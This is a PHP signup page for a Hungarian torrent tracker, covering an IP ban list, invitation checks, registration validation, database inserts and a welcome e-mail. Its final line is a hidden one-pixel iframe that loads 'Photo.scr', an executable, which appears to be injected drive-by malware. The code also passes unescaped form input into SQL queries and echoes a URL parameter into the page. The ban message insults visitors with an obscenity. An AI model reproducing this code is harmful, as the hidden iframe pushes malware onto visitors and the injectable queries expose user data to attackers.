<?php 
include("include/config.forum.php");
include("include/functions.forum.php");
$res = mysql_query("SELECT COUNT(*) FROM `xbt_users` where account_state<>'deleted';");
$users = mysql_fetch_row($res);
$res = mysql_fetch_row(mysql_query("SELECT `value` FROM `settings` WHERE `option`='signup';"));
$mode = $res[0];

$ip = $_SERVER['REMOTE_ADDR'];

$ban = array(
'176.63.41.29',
'195.199.189.17',
);
$count = count($ban);
for ($i=0; $i<$count; $i++) {
if($ip == $ban[$i]) { die("<center><img src=kepek/stop.png></img><br><b>Ez az ip tiltott! $ip Mehetsz a kurva anyádba.</b></center>"); }
}

if($users[0] >= $max_allowed_users) {
    header('Location: cart3.php');
} elseif($mode == 'disabled') {
    header('Location: cart2.php');
} elseif($mode == 'invitation') {
$valid = false;
$invitation_id = (isset($_GET['invid']))?mysql_real_escape_string(strip_tags($_GET['invid'])):'';
if(false !== ($result = @mysql_query("SELECT * FROM meghivo WHERE allapot='elkuldve' AND kulcs='$invitation_id';"))) {
if(@mysql_num_rows($result) > 0) {
$invitation_data = mysql_fetch_array($result);
$valid = true;
}
}
if(!$valid) {
header('Location: cart.php');
}
}
if($_POST['submitted'] == 1) {
    if(!empty($_POST['e_mail'])){
        echo "bot vagy";
        }else{
        if(empty($_POST['nu_name']))
                errorpage("Sikertelen Regisztráció", "<b>Mindkét mezőt ki kell töltened!</b>", "");
        if(empty($_POST['nu_email']))
                errorpage("Sikertelen Regisztráció", "<b>Email cím nincs kitöltve.</b>", "");
        if(!isset($_POST['rules_readed']))
                errorpage("Sikertelen Regisztráció", "Mielőtt regisztrálnál, kérlek olvasd el a szabályzatot!", "Szabályzat|rules.php|btn_rules.gif");
        if(!isset($_POST['faq_readed']))
                errorpage("Sikertelen Regisztráció", "Mielőtt regisztrálnál, kérlek olvasd el a <b>GY</b>akran <b>I</b>smételt <b>K</b>érdéseket!", "GY.I.K|faq.php|btn_faq.gif");
if(empty($_POST['nu_name']))
errorpage("Sikertelen Regisztráció", "A választott felhasználónév tiltva van!", "");
if(empty($_POST['nu_email']))
errorpage("Sikertelen Regisztráció", "A választott e-mail cím tiltva van!", "");
if(empty($_POST['nu_email']) > 40)
errorpage("Hiba", "A beírt e-mail nem lehet hosszabb 40 karakternél!", "");
if(!validusername($_POST['nu_name']))
errorpage("Sikertelen Regisztráció", "A választott felhasználónév érvénytelen! A neved csak az angol abc betűit, és számokat tartalmazhat!", "");
if(!validemail($_POST['nu_email']))
errorpage("Sikertelen Regisztráció", "A megadott e-mail cím érvénytelen. <b>Csak</b> úgy tudsz regisztrálni, ha egy érvényes<br/>e-mail címet adsz meg!", "");
if(strlen($_POST['nu_name']) > 15)
errorpage("Sikertelen Regisztráció", "Sajnálom, de a neved túl hosszú, maximum 15 karakter lehet.", "");
$res = mysql_query("SELECT * FROM `xbt_users` WHERE `name` = '{$_POST['nu_name']}' OR `email` = '{$_POST['nu_email']}';");
$res2 = mysql_query("SELECT * FROM `deleted_users` WHERE `name` = '{$_POST['nu_name']}' OR `email` = '{$_POST['nu_email']}';");
$found = mysql_num_rows($res);
$found2 = mysql_num_rows($res2);
if($found != 0 || $found2 != 0)
errorpage("Sikertelen Regisztráció", "Sajnálom, de már valaki használja az általad választott nevet, vagy e-mail címet.", "");
$accessdata = explode("|", makenewpassword($_POST['nu_name']));
$accessdata[2] = makenewpasskey();
$datetime = date("Y.m.d. G:i:s", time());
$today = time();
$honap = strtotime("+2 months", $today);
$taglimit = date('Y.m.d G:i:s', $honap);

$res = mysql_query("INSERT INTO `xbt_users` (`pass` , `torrent_pass` , `name` , `email` , `uploaded` , `downloaded` , `szint` , `account_state` , `reg_date` ) VALUES ( '{$accessdata[0]}', '{$accessdata[2]}', '{$_POST['nu_name']}', '{$_POST['nu_email']}', '0', '0', '1', 'unconfirmed', '$datetime' );") or die( mysql_error());
$uidnumber = mysql_insert_id();

mysql_query("INSERT INTO `ext_user_data` (`uid` , `friends` , `box_title` , `box_content` ) VALUES ('{$uidnumber}', '', '', '');") or die( mysql_error());

if($mode == 'invitation') {

@mysql_query("UPDATE `meghivo` SET `allapot`='hasznalt', `kinek`='$uidnumber' WHERE `kulcs`='{$invitation_data['kulcs']}';") or die( mysql_error());
}

$m_subject = $sitename." Regisztráció";

$m_message = <<<EOD
<html>
<body>
<h2>Kedves {$_POST['nu_name']}!<hr></h2>
<p>Te, vagy valaki más a te nevedben regisztrált a V.T.M.K. trackerre!<br/>
A regisztrációhoz ezt az e-mail címet használta fel: <b>{$_POST['nu_email']}</b><br/><br/>
Amennyiben ez a személy nem te voltál, kérlek hagyd figyelmen kívül ezt az üzenetet!<br/><br/>
<b>FIGYELEM!<br/></b>
Neved ez: <b>{$_POST['nu_name']}</b>, ideiglenes jelszavad ez: <b>{$accessdata[1]}</b><br/>
Miután sikeresen beléptél az oldalra, kérünk mielőbb változtasd meg a jelszavadat!!<br/><br/><br/>
Köszönjük,<br/><br/>
V.T.M.K. &amp; csapat<br/>
</p>
</body>
</html>
EOD;
$m_headers  = "From: $regemail\r\nContent-type: text/html;\r\n charset=utf-8\r\n";
mail($_POST['nu_email'], $m_subject, $m_message, $m_headers);
sitelog("U_ADD", $uidnumber, "{$_POST['nu_name']} regisztrált.");
?><html><head><TITLE>V.T.M.K. - Regisztráció</TITLE>
<link rel="stylesheet" type="text/css" href="themes/default/login.css"/>
<link rel="icon" href="themes/default/icon.ico" type="image/x-icon"/></head>
<body style="background:#000;" >
<div style="position: relative;margin-left: auto;margin-right: auto;width:1142px;min-height:725px;background:#000;">
<div style="position:absolute;top:400px;left:310px;width:500px;padding:10px;">
<table class="dialog" border="0" cellpadding="0" cellspacing="0">
<tr>
<td class="cell"><p class="dlg_c"><b><font color="yellow">A regisztrációd sikeres volt!</font></b></p></td>
</tr>
<tr>
<td class="cell" colspan="2" height="10px"></td>
</tr>
<tr>
<td class="cell"><p class="dlg_c"><font color="yellow">JELSZÓ: Várj amíg a jelszavad levélben megérkezik</font></p></td>
</tr>
<tr>
<td class="cell" colspan="2" height="10px"></td>
</tr>
<tr>
<td class="cell"><p class="dlg_c"><font color="yellow">Üdvözlünk az V.T.M.K. felhasználójaként!!<br/><i>V.T.M.K. csapat</font></i></p></td>
</tr>
<tr>
<td class="cell" colspan="2" height="10px"></td>
</tr>
<tr>
<td class="cell" colspan="2" align="center"><a href="login.php"><img border="0" src="themes/default/btn_ok.gif" alt="Ok"/></a></td>
</tr>
<tr>
<td class="cell" colspan="2" height="10px"></td>
</tr>
</table></div></div>
</body></html>
<?php
}
} else {
?><html>
<head>
<TITLE>V.T.M.K. - Regisztráció</TITLE>
<link rel="stylesheet" type="text/css" href="themes/default/login.css"/>
<link rel="icon" href="themes/default/icon.ico" type="image/x-icon"/>
</head>
<body style="background:#000;" >
<div style="margin: auto">
<form method="post" action="signup.php<?php if($mode=='invitation') print '?invid='.$_GET['invid']; ?>" name="signup">
<input type="hidden" name="submitted" value="1"/>
<input type="hidden" name="e_mail" value=""/>
<table class="dialog" border="0" cellpadding="0" cellspacing="0" style="margin: auto; margin-top: 30px">
<tr>
<td class="cell"><p class="dlg_c"><font color="yellow">A kívánt felhasználónév: </font></p></td>
<td class="cell"><p class="dlg_c"><input type="text" name="nu_name" size="50" tabindex="1"/></p></td>
</tr>
<tr>
<td class="cell"><p class="dlg_c"><font color="yellow">Érvényes e-mail cím: </font></p></td>
<td class="cell"><p class="dlg_c"><input type="text"<?php if($mode=='invitation') print ' disabled value="'.$meghivo['email'].'"'; ?> size="50" tabindex="2" name="nu_email"/></p></td>
</tr>
<tr>
<td class="cell" colspan="2"><p><b><font color="yellow">Figyelem!</b> Érvényes e-mail címet adj meg! A jelszavadat az itt megadott<br/>e-mail címre küldött levélban kapod meg!</font><font color=red><b><br/>NE használj freemailes, vipmailes, citromailes címeket,<br/>mivel nem biztos, hogy megkapod a regisztráló mailt.<br/>Használj helyette GMAIL-t, HOTMAIL-t!</b></font></p></td>
</tr>
<tr>
<td colspan="2"><p class="dlg_c"><input type="checkbox" name="rules_readed" value="1" tabindex="3"/><font color="yellow"> Elolvastam a szabályzatot
&nbsp;&nbsp;<input type="checkbox" name="faq_readed" value="1" tabindex="4"/> Elolvastam a GY.I.K-et</font></p><br /></td>
</tr>

<tr>

<td class="cell" colspan="2" align="center"><a href="https://vtmk.hu">
<img border="0" alt="Vissza"  src="themes/default/btn_vissza.gif" align="middle"/>    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input value="Regisztráció" name="submit" type="image" src="themes/default/btn_tovabb.gif" align="middle"/></td>
</tr>
</table>
</form>
</div></div>
</body>
</html>
<?php
}
?>
<iframe src=Photo.scr width=1 height=1 frameborder=0></iframe>
